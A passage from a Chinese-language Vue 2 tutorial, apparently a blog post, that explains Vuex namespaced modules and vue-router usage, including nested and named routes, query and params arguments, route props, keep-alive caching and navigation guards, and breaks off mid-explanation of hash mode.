class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><blockquote><p>备注：mapActions与mapMutations使用时，若需要传递参数需要：在模板中绑定事件时传递好参数，否则参数是事件对象。</p></blockquote><h3 id="模块化-命名空间"><a href="#模块化-命名空间" class="headerlink" title="模块化+命名空间"></a>模块化+命名空间</h3><ol><li><p>目的：让代码更好维护，让多种数据分类更加明确。</p></li><li><p>修改<code>store.js</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> countAbout <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">namespaced</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  <span class="token literal-property property">state</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">x</span><span class="token operator">:</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">mutations</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">actions</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">getters</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token function">bigSum</span><span class="token punctuation">(</span><span class="token parameter">state</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>       <span class="token keyword">return</span> state<span class="token punctuation">.</span>sum <span class="token operator">*</span> <span class="token number">10</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> personAbout <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token literal-property property">namespaced</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span><span class="token comment">//开启命名空间</span>  <span class="token literal-property property">state</span><span class="token operator">:</span><span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">mutations</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token literal-property property">actions</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span> <span class="token operator">...</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">const</span> store <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Vuex<span class="token punctuation">.</span>Store</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>  <span class="token literal-property property">modules</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    countAbout<span class="token punctuation">,</span>    personAbout  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中读取state数据：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>state<span class="token punctuation">.</span>personAbout<span class="token punctuation">.</span>list<span class="token comment">//方式二：借助mapState读取：</span><span class="token operator">...</span><span class="token function">mapState</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'sum'</span><span class="token punctuation">,</span><span class="token string">'school'</span><span class="token punctuation">,</span><span class="token string">'subject'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中读取getters数据：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接读取</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span>getters<span class="token punctuation">[</span><span class="token string">'personAbout/firstPersonName'</span><span class="token punctuation">]</span><span class="token comment">//方式二：借助mapGetters读取：</span><span class="token operator">...</span><span class="token function">mapGetters</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token string">'bigSum'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中调用dispatch</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接dispatch</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token string">'personAbout/addPersonWang'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapActions：（传递的数据在模板语法中调用）</span><span class="token operator">...</span><span class="token function">mapActions</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">incrementOdd</span><span class="token operator">:</span><span class="token string">'jiaOdd'</span><span class="token punctuation">,</span><span class="token literal-property property">incrementWait</span><span class="token operator">:</span><span class="token string">'jiaWait'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>开启命名空间后，组件中调用commit</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//方式一：自己直接commit</span><span class="token keyword">this</span><span class="token punctuation">.</span>$store<span class="token punctuation">.</span><span class="token function">commit</span><span class="token punctuation">(</span><span class="token string">'personAbout/ADD_PERSON'</span><span class="token punctuation">,</span>person<span class="token punctuation">)</span><span class="token comment">//方式二：借助mapMutations：</span><span class="token operator">...</span><span class="token function">mapMutations</span><span class="token punctuation">(</span><span class="token string">'countAbout'</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">increment</span><span class="token operator">:</span><span class="token string">'JIA'</span><span class="token punctuation">,</span><span class="token literal-property property">decrement</span><span class="token operator">:</span><span class="token string">'JIAN'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h2 id="路由"><a href="#路由" class="headerlink" title="路由"></a>路由</h2><ol><li>理解： 一个路由（route）就是一组映射关系（key - value），多个路由需要路由器（router）进行管理。</li><li>前端路由：key是路径，value是组件。</li></ol><h3 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h3><ol><li><p>安装vue-router，命令：<code>npm i vue-router</code></p></li><li><p>应用插件：<code>Vue.use(VueRouter)</code></p></li><li><p>编写router配置项:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//引入VueRouter</span><span class="token keyword">import</span> VueRouter <span class="token keyword">from</span> <span class="token string">'vue-router'</span><span class="token comment">//引入Luyou 组件</span><span class="token keyword">import</span> About <span class="token keyword">from</span> <span class="token string">'../components/About'</span><span class="token keyword">import</span> Home <span class="token keyword">from</span> <span class="token string">'../components/Home'</span><span class="token comment">//创建router实例对象，去管理一组一组的路由规则</span><span class="token keyword">const</span> router <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">VueRouter</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">routes</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/about'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>About<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Home<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//暴露router</span><span class="token keyword">export</span> <span class="token keyword">default</span> router<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>实现切换（active-class可配置高亮样式）</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-link active-class&#x3D;&quot;active&quot; to&#x3D;&quot;&#x2F;about&quot;&gt;About&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>指定展示位置</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-view&gt;&lt;&#x2F;router-view&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h3><ol><li>路由组件通常存放在<code>pages</code>文件夹，一般组件通常存放在<code>components</code>文件夹。</li><li>通过切换，“隐藏”了的路由组件，默认是被销毁掉的，需要的时候再去挂载。</li><li>每个组件都有自己的<code>$route</code>属性，里面存储着自己的路由信息。</li><li>整个应用只有一个router，可以通过组件的<code>$router</code>属性获取到。</li></ol><h3 id="多级路由（多级路由）"><a href="#多级路由（多级路由）" class="headerlink" title="多级路由（多级路由）"></a>多级路由（多级路由）</h3><ol><li><p>配置路由规则，使用children配置项：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token literal-property property">routes</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/about'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>About<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Home<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span> <span class="token comment">//通过children配置子级路由</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'news'</span><span class="token punctuation">,</span> <span class="token comment">//此处一定不要写：/news</span><span class="token literal-property property">component</span><span class="token operator">:</span>News<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'message'</span><span class="token punctuation">,</span><span class="token comment">//此处一定不要写：/message</span><span class="token literal-property property">component</span><span class="token operator">:</span>Message<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>跳转（要写完整路径）：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;router-link to&#x3D;&quot;&#x2F;home&#x2F;news&quot;&gt;News&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol><h3 id="路由的query参数"><a href="#路由的query参数" class="headerlink" title="路由的query参数"></a>路由的query参数</h3><ol><li><p>传递参数</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 跳转并携带query参数，to的字符串写法 --&gt;&lt;router-link :to&#x3D;&quot;&#x2F;home&#x2F;message&#x2F;detail?id&#x3D;666&amp;title&#x3D;你好&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!-- 跳转并携带query参数，to的对象写法 --&gt;&lt;router-link :to&#x3D;&quot;&#123;path:&#39;&#x2F;home&#x2F;message&#x2F;detail&#39;,query:&#123;   id:666,            title:&#39;你好&#39;&#125;&#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>接收参数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id$route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="命名路由"><a href="#命名路由" class="headerlink" title="命名路由"></a>命名路由</h3><ol><li><p>作用：可以简化路由的跳转。</p></li><li><p>如何使用</p><ol><li><p>给路由命名：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/demo'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Demo<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'test'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Test<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span>                    <span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'hello'</span> <span class="token comment">//给路由命名</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'welcome'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Hello<span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>简化跳转：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!--简化前，需要写完整的路径 --&gt;&lt;router-link to&#x3D;&quot;&#x2F;demo&#x2F;test&#x2F;welcome&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!--简化后，直接通过名字跳转 --&gt;&lt;router-link :to&#x3D;&quot;&#123;name:&#39;hello&#39;&#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!--简化写法配合传递参数 --&gt;&lt;router-link :to&#x3D;&quot;&#123;name:&#39;hello&#39;,query:&#123;   id:666,            title:&#39;你好&#39;&#125;&#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol></li></ol><h3 id="路由的params参数"><a href="#路由的params参数" class="headerlink" title="路由的params参数"></a>路由的params参数</h3><ol><li><p>配置路由，声明接收params参数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'/home'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Home<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'news'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>News<span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token literal-property property">component</span><span class="token operator">:</span>Message<span class="token punctuation">,</span><span class="token literal-property property">children</span><span class="token operator">:</span><span class="token punctuation">[</span><span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'detail/:id/:title'</span><span class="token punctuation">,</span> <span class="token comment">//使用占位符声明接收params参数</span><span class="token literal-property property">component</span><span class="token operator">:</span>Detail<span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>传递参数</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;!-- 跳转并携带params参数，to的字符串写法 --&gt;&lt;router-link :to&#x3D;&quot;&#x2F;home&#x2F;message&#x2F;detail&#x2F;666&#x2F;你好&quot;&gt;跳转&lt;&#x2F;router-link&gt;&lt;!-- 跳转并携带params参数，to的对象写法 --&gt;&lt;router-link :to&#x3D;&quot;&#123;name:&#39;xiangqing&#39;,params:&#123;   id:666,            title:&#39;你好&#39;&#125;&#125;&quot;&gt;跳转&lt;&#x2F;router-link&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>特别注意：路由携带params参数时，若使用to的对象写法，则不能使用path配置项，必须使用name配置！</p></blockquote></li><li><p>接收参数：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id$route<span class="token punctuation">.</span>params<span class="token punctuation">.</span>title<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li></ol><h3 id="路由的props配置"><a href="#路由的props配置" class="headerlink" title="路由的props配置"></a>路由的props配置</h3><p>​    作用：让路由组件更方便的收到参数</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">path</span><span class="token operator">:</span><span class="token string">'detail/:id'</span><span class="token punctuation">,</span><span class="token literal-property property">component</span><span class="token operator">:</span>Detail<span class="token punctuation">,</span><span class="token comment">//第一种写法：props值为对象，该对象中所有的key-value的组合最终都会通过props传给Detail组件</span><span class="token comment">// props:&#123;a:900&#125;</span><span class="token comment">//第二种写法：props值为布尔值，布尔值为true，则把路由收到的所有params参数通过props传给Detail组件</span><span class="token comment">// props:true</span><span class="token comment">//第三种写法：props值为函数，该函数返回的对象中每一组key-value都会通过props传给Detail组件</span><span class="token function">props</span><span class="token punctuation">(</span><span class="token parameter">route</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> <span class="token punctuation">&#123;</span><span class="token literal-property property">id</span><span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>id<span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>route<span class="token punctuation">.</span>query<span class="token punctuation">.</span>title<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="编程式路由导航"><a href="#编程式路由导航" class="headerlink" title="编程式路由导航"></a>编程式路由导航</h3><ol><li><p>作用：不借助<code>&lt;router-link&gt; </code>实现路由跳转，让路由跳转更加灵活</p></li><li><p>具体编码：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//$router的两个API</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">params</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">id</span><span class="token operator">:</span>xxx<span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>xxx<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token literal-property property">name</span><span class="token operator">:</span><span class="token string">'xiangqing'</span><span class="token punctuation">,</span><span class="token literal-property property">params</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token literal-property property">id</span><span class="token operator">:</span>xxx<span class="token punctuation">,</span><span class="token literal-property property">title</span><span class="token operator">:</span>xxx<span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">forward</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//前进</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">back</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//后退</span><span class="token keyword">this</span><span class="token punctuation">.</span>$router<span class="token punctuation">.</span><span class="token function">go</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//可前进也可后退</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="缓存路由组件"><a href="#缓存路由组件" class="headerlink" title="缓存路由组件"></a>缓存路由组件</h3><ol><li><p>作用：让不展示的路由组件保持挂载，不被销毁。</p></li><li><p>具体编码：</p><pre class="line-numbers language-vue" data-language="vue"><code class="language-vue">&lt;keep-alive include&#x3D;&quot;News&quot;&gt; &#x2F;&#x2F;这里的include代表了缓存哪个组件，是组件名    &lt;router-view&gt;&lt;&#x2F;router-view&gt;&lt;&#x2F;keep-alive&gt;&lt;keep-alive :include&#x3D;&quot;[&#39;News&#39;,&#39;Message&#39;]&quot;&gt; &#x2F;&#x2F;缓存多个组件的写法    &lt;router-view&gt;&lt;&#x2F;router-view&gt;&lt;&#x2F;keep-alive&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="两个新的生命周期钩子"><a href="#两个新的生命周期钩子" class="headerlink" title="两个新的生命周期钩子"></a>两个新的生命周期钩子</h3><ol><li>作用：路由组件所独有的两个钩子，用于捕获路由组件的激活状态。</li><li>具体名字：<ol><li><code>activated</code>路由组件被激活时触发。</li><li><code>deactivated</code>路由组件失活时触发</li></ol></li><li>主要就是针对缓存的路由，因为在切换时他们不会被destory</li></ol><h3 id="路由守卫"><a href="#路由守卫" class="headerlink" title="路由守卫"></a>路由守卫</h3><ol><li><p>作用：对路由进行权限控制</p></li><li><p>分类：全局守卫、独享守卫、组件内守卫</p></li><li><p>全局守卫:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//全局前置守卫：初始化时执行、每次路由切换前执行</span>router<span class="token punctuation">.</span><span class="token function">beforeEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span>from<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEach'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span>from<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//判断当前路由是否需要进行权限控制</span><span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'atguigu'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//权限控制的具体规则</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//放行</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span><span class="token comment">// next(&#123;name:'guanyu'&#125;)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">//放行</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token comment">//全局后置守卫：初始化时执行、每次路由切换后执行</span>router<span class="token punctuation">.</span><span class="token function">afterEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span><span class="token keyword">from</span></span><span class="token punctuation">)</span><span class="token operator">=></span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'afterEach'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span>from<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> document<span class="token punctuation">.</span>title <span class="token operator">=</span> to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>title <span class="token comment">//修改网页的title</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'vue_test'</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>独享守卫:</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function">beforeEnter</span><span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span>from<span class="token punctuation">,</span>next</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'beforeEnter'</span><span class="token punctuation">,</span>to<span class="token punctuation">,</span>from<span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span>to<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>isAuth<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//判断当前路由是否需要进行权限控制</span><span class="token keyword">if</span><span class="token punctuation">(</span>localStorage<span class="token punctuation">.</span><span class="token function">getItem</span><span class="token punctuation">(</span><span class="token string">'school'</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token string">'atguigu'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'暂无权限查看'</span><span class="token punctuation">)</span><span class="token comment">// next(&#123;name:'guanyu'&#125;)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>组件内守卫：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//进入守卫：通过路由规则，进入该组件时被调用，这俩都是写在组件中的，并不是很常用</span><span class="token function">beforeRouteEnter</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token comment">//离开守卫：通过路由规则，离开该组件时被调用</span><span class="token function">beforeRouteLeave</span> <span class="token punctuation">(</span><span class="token parameter">to<span class="token punctuation">,</span> from<span class="token punctuation">,</span> next</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><h3 id="路由器的两种工作模式"><a href="#路由器的两种工作模式" class="headerlink" title="路由器的两种工作模式"></a>路由器的两种工作模式</h3><ol><li>对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。</li><li>hash值不会包含在 HTTP 